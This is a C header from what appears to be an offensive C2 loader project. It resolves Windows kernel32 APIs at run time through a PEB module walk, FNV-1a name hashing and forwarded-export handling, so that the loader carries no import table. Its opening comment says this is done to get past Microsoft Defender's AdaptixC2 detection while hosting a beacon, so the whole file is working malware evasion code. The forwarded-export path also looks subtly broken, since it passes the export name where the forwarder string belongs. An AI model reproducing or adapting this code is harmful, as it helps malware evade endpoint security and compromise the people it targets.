/*
 * NaxResolv.h - zero-IAT kernel32 resolver for the PE wrappers.
 *
 * Defender's AdaptixC2.A family detection fires instantly on the wrapper
 * silhouette "tiny PE whose import table is exactly VirtualAlloc /
 * VirtualProtect / WaitForSingleObject / ExitProcess".  Cenotaph, which is
 * fully zero-IAT, ran clean hosting the same beacon, so the wrapper keeps
 * an EMPTY import table and resolves its APIs here instead.
 *
 * Hash is FNV-1a-32 (seed 0x811c9dc5, prime 0x01000193) with the Cenotaph
 * case-fold, ported verbatim from Cenotaph's proven CenHashString — the
 * length mode carries the UTF-16 NUL-skip quirk, so module names hash
 * identically to the walker below.  Names are hashed at run time from the
 * literal strings; no hash constants to mistranscribe.
 */
#pragma once
#include <Nax.h>
#include <intrin.h>

typedef unsigned int NaxU32;

static __inline__ NaxU32 NaxHashString( const void* String, unsigned long long Length ) {
    NaxU32 Hash = 0x811c9dc5;
    const unsigned char* Ptr = (const unsigned char*)String;
    unsigned char Char = 0;

    if ( ! String )
        return 0;

    do {
        Char = *Ptr;

        if ( ! Length ) {
            if ( ! *Ptr )
                break;
        } else {
            if ( (unsigned long long)( Ptr - (const unsigned char*)String ) >= Length )
                break;
            if ( ! *Ptr )
                Ptr++;
        }

        if ( Char >= 'a' )
            Char -= 0x20;

        Hash ^= Char;
        Hash *= 0x01000193;

        Ptr++;
    } while ( 1 );

    return Hash;
}

/* Walk PEB->Ldr->InLoadOrderModuleList via raw x64 offsets:
 * PEB.Ldr +0x18, InLoadOrderModuleList +0x10, entry->DllBase +0x30,
 * entry->BaseDllName.Length +0x58 (bytes), .Buffer +0x60. */
static void* NaxModuleByHash( NaxU32 Hash ) {
    unsigned long long ldr = __readgsqword( 0x60 );
    if ( ! ldr )
        return NULL;
    ldr = *(unsigned long long*)( ldr + 0x18 );
    if ( ! ldr )
        return NULL;

    unsigned long long head = ldr + 0x10;
    unsigned long long cur  = *(unsigned long long*)head;

    while ( cur && cur != head ) {
        void* base = *(void**)( cur + 0x30 );
        void* buf  = *(void**)( cur + 0x60 );
        unsigned int len = *(unsigned short*)( cur + 0x58 );

        if ( base && buf && len && NaxHashString( buf, len ) == Hash )
            return base;

        cur = *(unsigned long long*)cur;
    }
    return NULL;
}

static void* NaxFunction( void* Library, NaxU32 Hash );

/* Resolve a forwarded export ("KERNELBASE.Function"): split the prefix,
 * hash prefix + ".dll" the same way the module walker hashes BaseDllName,
 * recurse.  Ordinal forwarding ("Module.#N") returns NULL. */
static void* NaxFwdResolve( const char* FwdStr ) {
    wchar_t DllNameW[ 64 ] = { 0 };
    const char* DotPtr = FwdStr;
    const char* FuncName;
    void* FwdMod;
    int PfxLen, i;

    while ( *DotPtr && *DotPtr != '.' ) DotPtr++;
    if ( ! *DotPtr ) return NULL;
    FuncName = DotPtr + 1;
    PfxLen   = (int)( DotPtr - FwdStr );
    if ( PfxLen <= 0 || PfxLen > 59 ) return NULL;
    if ( *FuncName == '#' ) return NULL;

    for ( i = 0; i < PfxLen; i++ ) DllNameW[ i ] = (wchar_t)FwdStr[ i ];
    *(unsigned long long*)( &DllNameW[ PfxLen ] ) = 0x006C006C0064002Eull;   /* ".dll" UTF-16LE */
    DllNameW[ PfxLen + 4 ] = L'\0';

    FwdMod = NaxModuleByHash( NaxHashString( DllNameW, (unsigned long long)( PfxLen + 4 ) * 2 ) );
    if ( ! FwdMod ) return NULL;
    return NaxFunction( FwdMod, NaxHashString( FuncName, 0 ) );
}

static void* NaxFunction( void* Library, NaxU32 Hash ) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)Library;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_EXPORT_DIRECTORY exp;
    unsigned int *names, *funcs, i, n;
    unsigned short* ords;

    if ( ! Library || dos->e_magic != IMAGE_DOS_SIGNATURE )
        return NULL;

    nt = (PIMAGE_NT_HEADERS)( (unsigned char*)Library + dos->e_lfanew );
    if ( nt->Signature != IMAGE_NT_SIGNATURE )
        return NULL;

    if ( ! nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress )
        return NULL;

    exp = (PIMAGE_EXPORT_DIRECTORY)( (unsigned char*)Library +
        nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    n     = exp->NumberOfNames;
    names = (unsigned int*)( (unsigned char*)Library + exp->AddressOfNames );
    funcs = (unsigned int*)( (unsigned char*)Library + exp->AddressOfFunctions );
    ords  = (unsigned short*)( (unsigned char*)Library + exp->AddressOfNameOrdinals );

    for ( i = 0; i < n; i++ ) {
        const char* name = (const char*)( (unsigned char*)Library + names[ i ] );
        if ( NaxHashString( name, 0 ) == Hash ) {
            void* fn = (unsigned char*)Library + funcs[ ords[ i ] ];
            if ( (unsigned char*)fn >= (unsigned char*)exp &&
                 (unsigned char*)fn < (unsigned char*)exp +
                 nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size )
                return NaxFwdResolve( name );
            return fn;
        }
    }
    return NULL;
}

/* Resolve a kernel32 API by name at run time.  Re-walks per call; the
 * wrappers make a handful of boot-time calls, so re-walking is free and
 * keeps the resolver stateless (no C++ static locals: -nostdlib). */
static void* NaxApi( const char* Name ) {
    void* kern = NaxModuleByHash( NaxHashString( L"KERNEL32.DLL", 24 ) );
    if ( ! kern )
        return NULL;
    return NaxFunction( kern, NaxHashString( Name, 0 ) );
}